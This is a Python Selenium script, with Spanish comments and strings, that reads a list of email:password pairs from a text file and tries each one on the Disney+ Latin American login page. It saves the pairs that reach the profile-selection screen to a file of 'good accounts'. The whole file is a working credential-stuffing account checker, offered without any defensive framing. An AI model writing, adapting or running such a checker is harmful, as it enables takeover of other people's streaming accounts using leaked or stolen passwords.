#DEPURADOR DE CUENTAS DISNEY
from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
import numpy as np
import time
#Realizamos la importacion
import pandas as pd

#Leeemos el archivo de datos
df = pd.read_csv('disney.txt',sep=':')
# print(df.values)



inicio=0

final=len(df.values)

cuentas_buenas=[]
try:
    while inicio < final:
        driver = webdriver.Chrome(ChromeDriverManager().install())
        user = df.values[inicio][0]

        password = df.values[inicio][1]
        driver.get("https://www.disneyplus.com/es-419/login")
        time.sleep(5)
        input_user = driver.find_element(By.XPATH, "//input[@id='email']")
        input_user.send_keys(user)
        time.sleep(2)
        driver.find_element_by_xpath("//button[contains(text(),'CONTINUAR')]").click()
        time.sleep(2)
        if str(driver.current_url) == 'https://www.disneyplus.com/es-419/enter-passcode':
            driver.close()
            inicio = inicio + 1
        elif str(driver.current_url) == 'https://www.disneyplus.com/es-cl':
            driver.close()
            inicio = inicio + 1

        else:
            pass_user = driver.find_element(By.XPATH, "//input[@id='password']")
            pass_user.send_keys(password)
            time.sleep(2)
            driver.find_element_by_xpath("//button[contains(text(),'INICIAR SESIÓN')]").click()
            time.sleep(5)
            if str(driver.current_url) == "https://www.disneyplus.com/es-419/select-profile":
                cuentas_buenas.append([user, password])
                driver.close()
                inicio = inicio + 1
            else:
                pass

                driver.close()
                print(inicio)
                inicio = inicio + 1
    dp = pd.DataFrame(cuentas_buenas, columns=['Cuenta', 'Contraseña'])
    np.savetxt('cuentas_buenas.txt', dp.values, fmt='%s', delimiter=":", header="Cuenta \t Contrasena \t")

except:
    dp = pd.DataFrame(cuentas_buenas, columns=['Cuenta', 'Contraseña'])
    np.savetxt('cuentas_buenas.txt', dp.values, fmt='%s', delimiter=":", header="Cuenta \t Contrasena \t")





